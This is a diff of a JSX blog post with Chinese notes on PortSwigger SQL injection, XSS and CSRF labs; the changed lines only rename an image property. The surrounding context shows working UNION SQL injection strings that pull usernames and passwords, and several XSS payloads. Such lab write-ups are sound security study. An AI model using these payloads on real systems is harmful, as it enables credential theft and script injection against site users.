@@ -26,7 +26,7 @@ export default function Post() {
             <X.P>一样的要求，只不过变成了`Oracle`的环境。</X.P>
             <X.P>直接查所有表所有列：`/filter?category=Pets' and 1=0 union select column_name,table_name from all_tab_columns --+`；</X.P>
             <X.P>定位到表`USERS_BGRZGA`和列名`USERNAME_RKZNTV`、`PASSWORD_HEMVUU`，剩余流程和上一题一样。</X.P>
-            <X.Image src="lab-listing-the-database-contents-on-oracle.jpg" filterDarkTheme />
+            <X.Image src="lab-listing-the-database-contents-on-oracle.jpg" themeAdaptive />
             <X.H2>Pr: SQL injection UNION attack, determining the number of columns returned by the query</X.H2>
             <X.P>手动枚举出服务端查询返回三列。</X.P>
             <X.P>`/filter?category=Pets' and 1=0 union select NULL,NULL,NULL --+`</X.P>
@@ -41,7 +41,7 @@ export default function Post() {
             <X.P>先查查数据库：`/filter?category=Pets' and 1=0 union select 0,version() --+`，看到是PostgreSQL；字符串拼接以下两种方案都可以：</X.P>
             <X.Uli>`/filter?category=Pets' and 1=0 union select 0,concat(username,':',password) from users --+`</X.Uli>
             <X.Uli>`/filter?category=Pets' and 1=0 union select 0,username||':'||password from users --+`</X.Uli>
-            <X.Image src="lab-retrieving-multiple-values-in-a-single-column.jpg" filterDarkTheme />
+            <X.Image src="lab-retrieving-multiple-values-in-a-single-column.jpg" themeAdaptive />
             <X.H2>Pr: Blind SQL injection with conditional responses</X.H2>
             <X.P>盲注题目，本题注入点在`Cookie: TrackingId=...`中。当查询结果不为空时，页面上会显示`Welcome back!`。</X.P>
             <X.CodeBlock
@@ -165,8 +165,6 @@ export default function Post() {
                 `}
             />
 
-
-
             <X.H1>XSS: Cross-site scripting</X.H1>
             <X.H2>笔记</X.H2>
             <X.Uli>
@@ -243,13 +241,13 @@ export default function Post() {
             />
             <X.H2>Ap: Reflected XSS into attribute with angle brackets HTML-encoded</X.H2>
             <X.P>输入的内容被加载到`input`元素的`value`属性：</X.P>
-            <X.Image src="lab-attribute-angle-brackets-html-encoded.jpg" filterDarkTheme />
+            <X.Image src="lab-attribute-angle-brackets-html-encoded.jpg" themeAdaptive />
             <X.P>在本地`"onblur="alert(0)`这样的payload就可以触发，但是测试发现好像只有`onmouseover`，`onmouseenter`这种才能通过远程，暂时不清楚原因。</X.P>
             <X.H2>Ap: Stored XSS into anchor href attribute with double quotes HTML-encoded</X.H2>
             <X.P>表单的`website`域直接将传入的字符串作为`href`，因此payload为`javascript:alert(0)`。</X.P>
             <X.H2>Ap: Reflected XSS into a JavaScript string with angle brackets HTML encoded</X.H2>
             <X.P>搜索内容在后端被直接拼接在JavaScript代码里，注入点仍然是一个埋点（用于数据跟踪），比如搜索`123';123`，观察得到的HTML文档：</X.P>
-            <X.Image src="lab-javascript-string-angle-brackets-html-encoded.jpg" filterDarkTheme />
+            <X.Image src="lab-javascript-string-angle-brackets-html-encoded.jpg" themeAdaptive />
             <X.P>可以看到第二个`123`是有语法高亮的，因此可以构造payload为`0';alert(0);//`。</X.P>
             <X.H2>Pr: DOM XSS in document.write sink using source location.search inside a select element</X.H2>
             <X.P>注入点是`window.location.search`：</X.P>
@@ -303,7 +301,7 @@ export default function Post() {
                 `}
             />
             <X.P>`replace`函数这样调用只会转义首次出现的地方，正确实践应该使用正则表达式：</X.P>
-            <X.Image src="lab-stored-dom-xss.jpg" filterDarkTheme />
+            <X.Image src="lab-stored-dom-xss.jpg" themeAdaptive />
             <X.P>本题可以用{'`<><img src=0 onerror="alert(0)">`'}注入。</X.P>
             <X.H2>Pr: Reflected XSS into HTML context with most tags and attributes blocked</X.H2>
             <X.P>用@XSS Cheat Sheet[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet]@生成的字典fuzz一下，看到{'`<body onresize="print()">`'}没有被屏蔽；构造payload让`iframe`加载后触发`onresize`事件：</X.P>
@@ -390,7 +388,7 @@ export default function Post() {
             <X.Uli>默认情况下，`fetch`请求在跨源时不会携带Cookie，需要设置`credentials: 'include'`。注意如果Cookie的`SameSite`属性是`Lax`或`Strict`，即使设置了`credentials: 'include'`也不会携带。</X.Uli>
             <X.Uli>
                 <X.P>前面几个CSRF的Lab能打通是因为服务端下发的Cookie显式设置了`SameSite=None; Secure`，因此跨站请求时能够自动携带。实际上默认的`SameSite`属性是`Lax`（此时只能通过CSRF伪造`GET`请求）。</X.P>
-                <X.Image src="note-csrf.jpg" filterDarkTheme />
+                <X.Image src="note-csrf.jpg" themeAdaptive />
             </X.Uli>
             <X.Uli>
                 <X.P>`SameSite`属性是从2016年引入的，在此之前主流的CSRF防御方式是CSRF Token和双重提交Cookie。</X.P>
